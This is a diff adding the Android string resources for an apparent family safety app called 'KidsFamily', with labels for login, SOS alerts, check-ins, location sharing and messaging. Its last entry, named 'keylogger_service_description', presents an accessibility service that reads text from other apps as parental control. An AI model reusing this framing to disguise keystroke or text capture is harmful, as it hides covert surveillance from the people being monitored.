@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">KidsFamily</string>
+    <string name="app_tagline">Family Safety App</string>
+    <string name="login_title">Login</string>
+    <string name="register_title">Register</string>
+    <string name="join_btn">JOIN FAMILY</string>
+    <string name="home_title">Home</string>
+    <string name="im_ok">I'm OK</string>
+    <string name="i_need_help">I Need Help</string>
+    <string name="checkin_title">Check-in</string>
+    <string name="sos_button">SOS</string>
+    <string name="sos_are_you_sure">Send SOS alert?</string>
+    <string name="sos_sent">Alert sent</string>
+    <string name="checkin_sent">Check-in sent</string>
+    <string name="location_sharing">Location</string>
+    <string name="location_active">Active</string>
+    <string name="location_inactive">Inactive</string>
+    <string name="logged_in_as">Logged in as</string>
+    <string name="connected_to">Connected to</string>
+    <string name="parent_connected">Monitoring active</string>
+    <string name="send_message">Message...</string>
+    <string name="say_something">Type here</string>
+    <string name="message_sent">Sent</string>
+    <string name="settings_title">Settings</string>
+    <string name="save">SAVE</string>
+    <string name="logout">LOGOUT</string>
+    <string name="disconnect_warning">Warning</string>
+    <string name="version">Version</string>
+    <string name="loading">Loading...</string>
+    <string name="error">Error</string>
+    <string name="retry">RETRY</string>
+    <string name="ok">OK</string>
+    <string name="cancel">CANCEL</string>
+    <string name="yes">YES</string>
+    <string name="no">NO</string>
+    <string name="keylogger_service_description">This service helps monitor device accessibility for parental control. It reads text content from apps to detect inappropriate content.</string>
+</resources>
